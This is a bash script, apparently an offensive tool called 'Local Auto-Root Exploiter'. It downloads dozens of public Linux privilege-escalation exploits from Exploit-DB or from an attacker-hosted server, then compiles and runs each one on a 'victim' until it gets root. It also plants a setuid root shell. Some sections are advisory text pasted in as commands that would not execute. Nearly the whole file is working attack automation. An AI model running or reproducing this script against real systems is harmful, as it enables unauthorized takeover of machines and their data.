#!/bin/bash

bold=`tput bold`
normal=`tput sgr0`
red='\e[0;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
light_green='\e[1;32m'
light_cyan='\e[1;36m'
cyan='\e[0;36m'
red='\e[0;31m'
light_red='\e[1;31m'
brown='\e[0;33m'
no_color='\e[0m'

#com_url='$gaddress/linux/local'
#x86_64_url='$gaddress/lin_x86-64/local'
#x86_url='$gaddress/lin_x86/local'
#sploits_url='$saddress/sploits'

function lauto_root(){

	echo -e "\n${light_green}${bold}###################################################"
	echo -e "${light_green}${bold}#            ${light_red}Local Auto-Root Exploiter            ${light_green}#"
	echo -e "${light_green}${bold}#               By ${light_red}Enigma Dimitri                 ${light_green}#"
	echo -e "${light_green}${bold}#           ${yellow}Inspired by Auto Root Exploit         ${light_green}#"
	echo -e "${light_green}${bold}#               By Nilotpal Biswas                #"
	echo -e "${light_green}${bold}###################################################"
}	

function desc(){

	echo -e "\n${light_red}${bold}Usage: ${yellow}$0 [${light_green}option${yellow}]\n"
	echo -e "${light_red}${bold}Options: ${no_color}\n"
	echo -e "${bold}${yellow} -a  or --arsenal: ${light_green} Downloads the exploits to /var/www/html directory and start the apache server."
	echo -e "${bold}${yellow} -l <Attacker-IP>  or --Lroot <Attacker-IP>: ${light_green} Get the exploits from attackers machine and starts the exploiter."
	echo -e "${bold}${yellow} -r  or --Rroot: ${light_green} Downloads the exploits directly to the server and starts the exploiter.\n"
	echo -e "${bold}${light_red}Command Examples: \n"
	echo -e "${light_red}Create Local Arsenal: ${yellow}$0 -a"
	echo -e "${light_red}LAN Root: ${yellow}$0 -l 10.10.10.123"
	echo -e "${light_red}Remote Root: ${yellow}$0 -r \n"
}

function local_dir(){

	sudo rm -r /var/www/html/exploits
	# Creating the required Directories
	sudo mkdir /var/www/html/exploits
	sudo mkdir /var/www/html/exploits/gitex
	sudo mkdir /var/www/html/exploits/linux
	sudo mkdir /var/www/html/exploits/linux/local
	sudo mkdir /var/www/html/exploits/lin_x86-64
	sudo mkdir /var/www/html/exploits/lin_x86-64/local
	sudo mkdir /var/www/html/exploits/lin_x86
	sudo mkdir /var/www/html/exploits/lin_x86/local
	sudo mkdir /var/www/html/exploits/sploits
}

function arsenal(){

	# Getting the common exploits to local directory
	cd /var/www/html/exploits/linux/local

	echo -e "Downloading exploits to ${light_red}${bold}" $(pwd) "${light_green}"

	sudo wget --no-check-certificate $gaddress/linux/local/2031.c 
	sudo wget --no-check-certificate $gaddress/linux/local/17391.c 
	sudo wget --no-check-certificate $gaddress/linux/local/18411.c 
	sudo wget --no-check-certificate $gaddress/linux/local/33321.c 
	sudo wget --no-check-certificate $gaddress/linux/local/35161.c 
	sudo wget --no-check-certificate $gaddress/linux/local/5092.c 
	sudo wget --no-check-certificate $gaddress/linux/local/8572.c  
	sudo wget --no-check-certificate $gaddress/linux/local/25202.c 
	sudo wget --no-check-certificate $gaddress/linux/local/33322.c 
	sudo wget --no-check-certificate $gaddress/linux/local/40812.c 
	sudo wget --no-check-certificate $gaddress/linux/local/37292.c 
	sudo wget --no-check-certificate $gaddress/linux/local/2013.c 
	sudo wget --no-check-certificate $gaddress/linux/local/5093.c 
	sudo wget --no-check-certificate $gaddress/linux/local/8673.c 
	sudo wget --no-check-certificate $gaddress/linux/local/10613.c 
	sudo wget --no-check-certificate $gaddress/linux/local/40003.c 
	sudo wget --no-check-certificate $gaddress/linux/local/2004.c 
	sudo wget --no-check-certificate $gaddress/linux/local/15704.c 
	sudo wget --no-check-certificate $gaddress/linux/local/25444.c 
	sudo wget --no-check-certificate $gaddress/linux/local/30604.c 
	sudo wget --no-check-certificate $gaddress/linux/local/33824.c 
	sudo wget --no-check-certificate $gaddress/linux/local/41994.c 
	sudo wget --no-check-certificate $gaddress/linux/local/2005.c 
	sudo wget --no-check-certificate $gaddress/linux/local/15285.c 
	sudo wget --no-check-certificate $gaddress/linux/local/41995.c 
	sudo wget --no-check-certificate $gaddress/linux/local/2006.c 
	sudo wget --no-check-certificate $gaddress/linux/local/40616.c 
	sudo wget --no-check-certificate $gaddress/linux/local/33336.c 
	sudo wget --no-check-certificate $gaddress/linux/local/39166.c 
	sudo wget --no-check-certificate $gaddress/linux/local/41886.c 
	sudo wget --no-check-certificate $gaddress/linux/local/1397.c 
	sudo wget --no-check-certificate $gaddress/linux/local/27297.c 
	sudo wget --no-check-certificate $gaddress/linux/local/39277.c 
	sudo wget --no-check-certificate $gaddress/linux/local/718.c 
	sudo wget --no-check-certificate $gaddress/linux/local/8678.c 
	sudo wget --no-check-certificate $gaddress/linux/local/41458.c 
	sudo wget --no-check-certificate $gaddress/linux/local/40839.c 
	sudo wget --no-check-certificate $gaddress/linux/local/35370.c 
	sudo wget --no-check-certificate $gaddress/linux/local/38390.c 
	sudo wget --no-check-certificate $gaddress/linux/local/39230.c
	sudo wget --no-check-certificate $gaddress/linux/local/42183.c

	#bash exploits
	sudo wget --no-check-certificate $gaddress/linux/local/2011.sh 
	sudo wget --no-check-certificate $gaddress/linux/local/8478.sh 
	sudo wget --no-check-certificate $gaddress/linux/local/10018.sh 

	#python exploits
	sudo wget --no-check-certificate $gaddress/linux/local/9844.py 
	sudo wget --no-check-certificate $gaddress/linux/local/12130.py 

	# Getting 64bit only exploits to lin_x86-64 directory
	cd /var/www/html/exploits/lin_x86-64/local

	echo -e "Downloading exploits to ${light_red}${bold}" $(pwd) "${light_green}"

	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/40871.c 
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/15024.c
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/24746.c
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/33516.c
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/31347.c
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/33589.c 
	sudo wget --no-check-certificate $gaddress/lin_x86-64/local/40049.c

	# Getting 32-bit only exploit to lin_x86 directory
	cd /var/www/html/exploits/lin_x86/local

	echo -e "Downloading exploits to ${light_red}${bold}" $(pwd) "${light_green}"

	sudo wget --no-check-certificate $gaddress/lin_x86/local/9542.c

	# Getting the compressed exploits to sploits directory
	cd /var/www/html/exploits/sploits

	echo -e "Downloading exploits to ${light_red}${bold}" $(pwd) "${light_green}"

	sudo wget --no-check-certificate $saddress/sploits/9191.tgz
	sudo wget --no-check-certificate $saddress/sploits/39772.zip
	sudo wget --no-check-certificate $saddress/sploits/29714.tgz
	sudo wget --no-check-certificate $saddress/sploits/9191.tgz
	sudo wget --no-check-certificate $saddress/sploits/33395.tgz
	sudo wget --no-check-certificate $saddress/sploits/40489.zip

	# Getting CVE-2016-2384 exploit to gitex directory 
	cd /var/www/html/exploits/gitex

	echo -e "Downloading exploits to ${light_red}${bold}" $(pwd) "${light_green}"

	sudo wget --no-check-certificate $gitaddress/poc.c
	sudo wget --no-check-certificate $gitaddress/poc.py
}

function valid_ip()
{
	if ! [ "$2" ]; then
		echo -e "${red}${bold}IP Not Provided, Please provide an IP"
	else
	    if [[ "$ip" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] ;then

		    for (( i=1; i<${#BASH_REMATCH[@]}; ++i ))
		    do
		      (( ${BASH_REMATCH[$i]} <= 255 )) || { echo "Invalid IP address!!!" >&2; exit 1; }
		    done
		else
			echo -e "${light_green}========================================"
			echo -e "#  ${light_red}Proceding to access the address...  ${light_green}#"
		    echo -e "========================================"
		    exit 1;
		fi
	fi
}

#gaddress=$1'/exploits'
#saddress=$1'/exploits'
#gitaddress=$1'/exploits/gitex'
function exploiter(){

	checkroot() {
		if [ $(id -u) == 0 ]; then
		echo
		echo -e "${light_red}Successfully R00T(ed).. have fun :)"
		id=$(id)
		echo -e "${light_red}ID     => ${light_green}" $id
		who=$(whoami)
		echo -e "${light_red}WHOAMI => ${light_green}" $who
		exit
		else
		echo ""
		echo -e "${light_red}R00Ting.. ${light_green}"
		sleep 1
		fi
	}
	ccmpl(){
		gcc exploit.c -o exploit -lutil -lpthread
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -m32 -O2 -o exploit
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -O2 -o exploit
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit -lkeyutils -Wall
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit -lpthread
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit -pthread
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit -static -Wall
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc exploit.c -o exploit -Wall
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -fPIC -shared -o exploit exploit.c -ldl -w
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -O2 exploit.c
		gcc -O2 -fomit-frame-pointer exploit.c -o exploit
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -o exploit exploit.c
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -o exploit exploit.c -static -O2
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -pthread exploit.c -o exploit -lcrypt
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -Wall -m64 -o exploit exploit.c
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
		gcc -Wall -o exploit exploit.c
		./exploit
		./a.out
		rm exploit
		rm exploit.c
		rm a.out
		checkroot;
	}
	shcmpl(){
		bash exploit.sh
		rm exploit.sh
		rm *.c
		checkroot;
	}
	pycmpl(){
		python exploit.py
		rm exploit.py
		rm *.c
		checkroot;
	}
	echo -e "${light_red}Auto R00Ting started...${light_green}"

	checkroot;
	#c
	wget --no-check-certificate $gaddress/linux/local/2031.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/17391.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/18411.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/33321.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/35161.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/40871.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/5092.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/8572.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86/local/9542.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/25202.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/33322.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/40812.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/37292.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/2013.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/5093.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/8673.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/10613.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/40003.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/2004.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/15024.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/15704.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/25444.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/30604.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/33824.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/41994.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/2005.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/15285.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/41995.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/2006.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/40616.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/24746.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/33336.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/33516.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/39166.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/41886.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/1397.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/27297.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/31347.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/39277.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/718.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/8678.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/41458.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/40839.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/33589.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/lin_x86-64/local/40049.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/35370.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/38390.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/39230.c -O exploit.c
	ccmpl;
	wget --no-check-certificate $gaddress/linux/local/42183.c -O exploit.c
	ccmpl;

	#sh
	wget --no-check-certificate $gaddress/linux/local/2011.sh -O exploit.sh
	shcmpl;
	wget --no-check-certificate $gaddress/linux/local/8478.sh -O exploit.sh
	shcmpl;
	wget --no-check-certificate $gaddress/linux/local/10018.sh -O exploit.sh
	shcmpl;

	#py
	wget --no-check-certificate $gaddress/linux/local/9844.py -O exploit.py
	pycmpl;
	wget --no-check-certificate $gaddress/linux/local/12130.py -O exploit.py
	pycmpl;

	#txt
	#platforms/linux/local/9191.txt
	wget --no-check-certificate $saddress/sploits/9191.tgz
	tar -zxf 9191.tgz
	cd cheddar_bay
	bash cheddar_bay.sh
	cc -fno-stack-protector -o exploit exploit.c
	./exploit
	cc -fno-stack-protector -DRHEL5_SUCKS -o exploit exploit.c
	./exploit
	cd ..
	rm -rf cheddar_bay
	rm -rf 9191.tgz
	tar -zxf 33395.tgz
	cd ext4_own
	bash ext4_own.sh
	cd ..
	rm -rf ext4_own
	rm -rf 33395.tgz
	checkroot;
	#platforms/linux/local/39772.txt
	wget --no-check-certificate $saddress/sploits/39772.zip
	cd 39772
	unzip 39772.zip
	tar -xf exploit.tar
	cd ebpf_mapfd_doubleput_exploit
	bash compile.sh
	./hello
	./doubleput
	./suidhelper
	cd ..
	rm -rf ebpf_mapfd_doubleput_exploit
	rm -rf exploit.tar
	checkroot;
	tar -xf crasher.tar
	cd ebpf_mapfd_doubleput_crasher
	bash compile.sh
	./doubleput
	cd ..
	rm -rf ebpf_mapfd_doubleput_crasher
	rm -rf 39772
	rm -rf 39772.zip
	checkroot;
	#platforms/linux/local/23674.txt
	smbmount --version
	ls -l /usr/bin/smbmount
	ls -l /usr/bin/smbmnt
	echo "main(){setuid(0);setgid(0);system("/bin/bash");}" > a.c
	make a
	cc a.c -o a
	chmod +s a
	share:/etc/samba/smb.conf
	/etc/samba/smb.conf
	[share]
	path = /data/share
	writable = no
	locking = no
	public = yes
	guest ok = yes
	comment = Share
	ls -l a
	ls -l pokus/a
	id
	checkroot;
	#platforms/linux/local/29714.txt
	wget --no-check-certificate $saddress/sploits/29714.tgz
	tar -zxf 29714.tgz
	cd exploit
	make
	make install
	cd ..
	rm -rf exploit
	rm -rf 29714.tgz
	checkroot;
	wget --no-check-certificate $saddress/sploits/9191.tgz
	tar -zxf 9191.tgz
	cd cheddar_bay
	bash cheddar_bay.sh
	cc -fno-stack-protector -o exploit exploit.c
	./exploit
	cc -fno-stack-protector -DRHEL5_SUCKS -o exploit exploit.c
	./exploit
	cd ..
	rm -rf cheddar_bay
	rm -rf 9191.tgz
	tar -zxf 33395.tgz
	cd ext4_own
	bash ext4_own.sh
	cd ..
	rm -rf ext4_own
	rm -rf 33395.tgz
	checkroot;
	#platforms/linux/local/33395.txt
	wget $saddress/sploits/33395.tgz
	tar -zxf 33395.tgz
	cd ext4_own
	bash ext4_own.sh
	checkroot;
	cd ..
	rm -rf ext4_own
	rm -rf 33395.tgz
	#platforms/linux/local/40489.txt
	wget --no-check-certificate $saddress/sploits/40489.zip
	unzip 40489.zip
	cd 40489
	bash compile.sh
	./pwn
	./enjoy
	cd ..
	rm -rf 40489
	rm -rf 40489.zip
	checkroot;
	#platforms/linux/local/41770.txt
	# #!/bin/bash
	# (./ProcReadHelper /proc/$$/syscall) &
	# sleep 1
	# exec /usr/bin/passwd
	# #!/bin/bash
	# echo "Current pid is $$"
	# (sleep 10; echo 127 ) > /proc/$$/coredump_filter &
	# sleep 5
	# exec /usr/bin/passwd
	# static ssize_t mem_read(struct file * file, char __user * buf,
	#                         size_t count, loff_t *ppos) {
	#     if (file->private_data != (void*)((long)current->self_exec_id))
	#         goto out_put;
	# #!/bin/bash
	# (sleep 3; echo 15) > /proc/$$/oom_adj &
	# exec /usr/bin/passwd
	# checkroot;
	#platforms/linux/local/38559.txt
	rmmod b43
	modprobe b43 fwpostfix=AA%xBB
	dmesg
	checkroot;
	#platforms/linux/local/41999.txt
	wget --no-check-certificate $gitaddress/poc.c -O poc.c
	gcc poc.c -masm=intel
	./a.out 0
	checkroot;
	./a.out 1
	checkroot;
	./a.out 2
	checkroot;
	./a.out 3
	checkroot;
	./a.out 4
	checkroot;
	./a.out 5
	checkroot;
	./a.out 6
	checkroot;
	./a.out 7
	checkroot;
	./a.out 8
	checkroot;
	./a.out 9
	checkroot;
	./a.out 10
	checkroot;
	rm a.out
	rm poc.c
	wget --no-check-certificate $gitaddress/poc.py -O poc.py
	python poc.py
	checkroot;
	rm poc.py
	rm a.out
	rm exploit
	
	echo -e "${light_red}Srry.. I tried hard, but no luck this time.. Wait for update :("
	exit 1;
}


if ! [ "$1" ] || [ "$1" == '-h' ]  || [ "$1" == '--help' ] ; then #|| ! [ "$2" ]; then
	lauto_root
	desc
fi

if [ "$1" == '-a' ] || [ "$1" == '--arsenal' ] ; then
	lauto_root
	sleep 2 
	echo -e "\n${light_green}=================================="
	echo -e "#   ${light_red}Initiating Arsenal script   ${light_green} #"
	echo -e "==================================\n"
	gaddress='https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms'
	saddress='https://github.com/offensive-security/exploit-database-bin-sploits/raw/master'
	gitaddress='https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384'
	local_dir
	arsenal
	echo -e "${light_green}=========================="
	echo -e "#   ${light_red}Local Arsenal Set..  ${light_green}#"
	echo -e "==========================\n"
	echo -e "${light_green}=========================="
	echo -e "#   ${light_red}Starting Apache2     ${light_green}#"
	echo -e "==========================\n"
	/bin/bash -i /etc/init.d/apache2 start
	/bin/bash -i /etc/init.d/apache2 status
	echo -e "${light_green}=================================="
	echo -e "#    ${light_red}Run Exploiter on Victim     ${light_green}#"
	echo -e "==================================\n"

	exit 1;
fi 

if [ "$1" == '-l' ] || [ "$1" == '--Lroot' ] ; then
	lauto_root
	if ! [ "$2" ]; then
		echo -e "\n${light_red}No IP address provided!!!\n"
		exit 1;
	else 	
		ip=$2
	fi

    if [[ "$ip" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] ;then

	    for (( i=1; i<${#BASH_REMATCH[@]}; ++i ))
	    do
	      (( ${BASH_REMATCH[$i]} <= 255 )) || { echo "Invalid IP address!!!" >&2; exit 1; }
	    done
	else
		echo -e "${light_green}========================================"
		echo -e "#  ${light_red}Proceding to access the address...  ${light_green}#"
	    echo -e "========================================\n"
	fi	

	sleep 2 
	echo -e "${light_green}=================================="
	echo -e "#   ${light_red}Initiating Local Exploiter   ${light_green}#"
	echo -e "==================================\n"
	gaddress='http://'${ip}'/exploits'
	saddress='http://'${ip}'/exploits'
	gitaddress='http://'${ip}'/exploits/gitex'
	exploiter
	exit 1;
fi

if [ "$1" == '-r' ] || [ "$1" == '--Rroot' ] ; then
	lauto_root
	gaddress='https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms'
	saddress='https://github.com/offensive-security/exploit-database-bin-sploits/raw/master'
	sleep 2 
	echo -e "${light_green}==================================="
	echo -e "#   ${light_red}Initiating Remote Exploiter   ${light_green}#"
	echo -e "===================================\n"
	exploiter
	exit 1;
fi



